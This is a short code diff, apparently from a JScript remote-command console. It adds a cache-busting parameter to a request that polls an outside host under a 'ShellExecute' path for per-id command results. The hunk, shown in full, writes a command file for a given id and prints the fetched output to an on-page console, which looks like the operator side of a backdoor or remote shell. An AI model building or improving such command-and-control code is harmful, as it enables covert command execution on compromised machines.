@@ -69,7 +69,7 @@
 			setTimeout(function(){
 				sendtext(id.value + ".txt", "null");
 				var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");
-				xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/" + id.value + ".result.txt", false);
+				xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/" + id.value + ".result.txt?rand=" + new Date().getTime(), false);
 				xmlhttp.Send();
 				
 				console.innerHTML += "< " + xmlhttp.responseText + "<br>";
